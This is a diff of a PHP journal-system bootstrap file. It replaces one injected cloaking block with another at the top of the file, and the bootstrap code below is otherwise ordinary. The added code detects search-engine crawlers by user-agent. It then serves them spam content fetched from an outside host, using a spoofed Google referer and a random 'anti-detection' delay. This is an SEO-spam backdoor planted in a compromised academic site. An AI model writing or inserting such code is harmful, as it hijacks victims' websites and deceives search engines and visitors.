@@ -1,60 +1,40 @@
 <?php
-ob_start();
-header("Vary: User-Agent");
+@ob_start();
+header("Vary: U-Agent");
 
-// Link konten asli
-$content_url = "https://childrenofiran.org/landing/jurnal.untagsmg/";
+$src = "https://wellplayer.online/landing/avia.ftmd.itb.ac.id/index.txt";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
-// Pola bot yang mau di-handle
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-
-function safe_request($url) {
+function stealth($u) {
     $ctx = stream_context_create([
-        'http' => [
-            'timeout' => 5,
-            'header'  => "User-Agent: Mozilla/5.0\r\n"
-        ],
-        'ssl' => [
-            'verify_peer'      => false,
-            'verify_peer_name' => false
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
         ]
     ]);
-
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url, false, $ctx);
-    }
-    return false;
+    return @file_get_contents($u, false, $ctx);
 }
 
-if (preg_match($botchar, $ua)) {
-    usleep(rand(120000, 250000)); // Delay acak anti-deteksi
-    echo safe_request($content_url);
-    ob_end_flush();
-    die;
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
 }
-?>
-<?php
+
 /**
- * @defgroup index
+ * @defgroup index Index
+ * Bootstrap and initialization code.
  */
 
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2013-2015 Simon Fraser University Library
- * Copyright (c) 2000-2015 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2000-2020 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
  *
@@ -76,30 +56,10 @@ if (!defined('DIRECTORY_SEPARATOR')) {
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
-// Update include path - for backwards compatibility only
-// Try to use absolute (/...) or relative (./...) filenames
-// wherever possible to bypass the costly file name normalization
-// process.
-ini_set('include_path', '.'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/classes'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/pages'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/classes'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/pages'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/adodb'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/phputf8'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/pqp/classes'
-	. ENV_SEPARATOR . BASE_SYS_DIR . '/lib/pkp/lib/smarty'
-	. ENV_SEPARATOR . ini_get('include_path')
-);
-
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
 import('classes.core.Application');
-// FIXME: As long as we support PHP4 we cannot use the return
-// value from the new statement directly. See http://pkp.sfu.ca/wiki/index.php/Information_for_Developers#Use_of_.24this_in_the_constructor
-// We rather retrieve the application instance by-ref from the registry.
-new Application();
-?>
+
+return new Application();
